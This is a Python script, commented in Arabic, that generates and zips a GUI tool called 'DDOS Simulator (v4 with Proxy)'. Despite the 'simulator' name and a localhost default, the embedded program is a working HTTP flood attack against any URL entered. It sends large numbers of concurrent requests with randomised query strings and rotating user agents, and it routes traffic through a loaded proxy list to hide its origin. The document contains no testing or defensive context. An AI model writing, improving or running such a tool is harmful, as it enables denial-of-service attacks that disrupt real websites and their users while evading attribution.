import os
import zipfile

# المسارات
script_v4_path = "ddos_sim_gui_v4_proxy.zip"
script_v4_dir = "ddos_sim_gui_v4_proxy"
os.makedirs(script_v4_dir, exist_ok=True)

# كود سكربت ddos_gui.py
ddos_gui_v4_code = '''
import tkinter as tk
from tkinter import messagebox, filedialog
import threading
import random
import aiohttp
import asyncio
import time

class DDOSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("DDOS Simulator (v4 with Proxy)")
        self.root.geometry("500x480")

        self.proxies = []

        tk.Label(root, text="Target URL:").pack()
        self.url_entry = tk.Entry(root, width=50)
        self.url_entry.insert(0, "http://localhost:8080")
        self.url_entry.pack(pady=5)

        tk.Label(root, text="Number of Requests:").pack()
        self.req_entry = tk.Entry(root, width=20)
        self.req_entry.insert(0, "100")
        self.req_entry.pack(pady=5)

        tk.Label(root, text="Concurrency Level:").pack()
        self.thread_entry = tk.Entry(root, width=20)
        self.thread_entry.insert(0, "10")
        self.thread_entry.pack(pady=5)

        tk.Label(root, text="HTTP Method:").pack()
        self.http_method = tk.StringVar(value="GET")
        for method in ["GET", "POST", "HEAD", "PUT"]:
            tk.Radiobutton(root, text=method, variable=self.http_method, value=method).pack()

        self.use_proxy = tk.BooleanVar()
        tk.Checkbutton(root, text="Use Proxy List", variable=self.use_proxy).pack(pady=5)
        self.load_btn = tk.Button(root, text="Load Proxy List", command=self.load_proxy_list)
        self.load_btn.pack()

        self.start_btn = tk.Button(root, text="Start Attack", command=self.start_attack)
        self.start_btn.pack(pady=20)

        self.status_label = tk.Label(root, text="Status: Ready", fg="green")
        self.status_label.pack()

    def load_proxy_list(self):
        path = filedialog.askopenfilename(title="Select proxy list", filetypes=(("Text Files", "*.txt"),))
        if path:
            with open(path, "r") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            messagebox.showinfo("Proxy Loaded", f"Loaded {len(self.proxies)} proxies")

    def start_attack(self):
        url = self.url_entry.get()
        try:
            total_requests = int(self.req_entry.get())
            concurrency = int(self.thread_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Requests and Concurrency must be integers")
            return

        if self.use_proxy.get() and not self.proxies:
            messagebox.showerror("Proxy Error", "No proxies loaded!")
            return

        method = self.http_method.get()
        self.start_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Status: Attacking...", fg="red")
        threading.Thread(target=self.run_attack, args=(url, total_requests, concurrency, method)).start()

    def run_attack(self, url, total_requests, concurrency, method):
        asyncio.run(self.ddos_attack(url, total_requests, concurrency, method))
        self.start_btn.config(state=tk.NORMAL)
        self.status_label.config(text="Status: Done", fg="blue")

    async def ddos_attack(self, url, total_requests, concurrency, method):
        success = 0
        fail = 0
        results = []

        async def send(session, i):
            nonlocal success, fail
            random_path = f"{url}?r={random.randint(1,99999)}" if method in ["GET", "HEAD"] else url
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (Linux; Android 10)",
                    "curl/7.64.1",
                    "Python/3.10"
                ])
            }
            proxy = None
            if self.use_proxy.get() and self.proxies:
                proxy = random.choice(self.proxies)

            try:
                if method == "GET":
                    async with session.get(random_path, headers=headers, proxy=proxy) as response:
                        results.append(f"GET {i}: {response.status}")
                        success += 1
                elif method == "POST":
                    data = {"username": "admin", "password": "test123"}
                    async with session.post(random_path, headers=headers, data=data, proxy=proxy) as response:
                        results.append(f"POST {i}: {response.status}")
                        success += 1
                elif method == "HEAD":
                    async with session.head(random_path, headers=headers, proxy=proxy) as response:
                        results.append(f"HEAD {i}: {response.status}")
                        success += 1
                elif method == "PUT":
                    data = "updated content here"
                    async with session.put(random_path, headers=headers, data=data, proxy=proxy) as response:
                        results.append(f"PUT {i}: {response.status}")
                        success += 1
            except Exception as e:
                results.append(f"{method} {i}: Error - {str(e)}")
                fail += 1

        connector = aiohttp.TCPConnector(limit=concurrency)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [send(session, i) for i in range(total_requests)]
            await asyncio.gather(*tasks)

        # حفظ النتائج
        timestamp = int(time.time())
        with open(f"ddos_log_{timestamp}.txt", "w") as log_file:
            log_file.write("\\n".join(results))
            log_file.write(f"\\n\\nSuccess: {success}, Failed: {fail}")
        print(f"Saved log as ddos_log_{timestamp}.txt")

if __name__ == "__main__":
    root = tk.Tk()
    app = DDOSApp(root)
    root.mainloop()
'''

# حفظ السكربت داخل المجلد
with open(os.path.join(script_v4_dir, "ddos_gui.py"), "w") as f:
    f.write(ddos_gui_v4_code)

# ضغط السكربت في ملف ZIP
with zipfile.ZipFile(script_v4_path, 'w') as zipf:
    for foldername, subfolders, filenames in os.walk(script_v4_dir):
        for filename in filenames:
            filepath = os.path.join(foldername, filename)
            arcname = os.path.relpath(filepath, script_v4_dir)
            zipf.write(filepath, arcname)

print(f"ZIP created: {script_v4_path}")
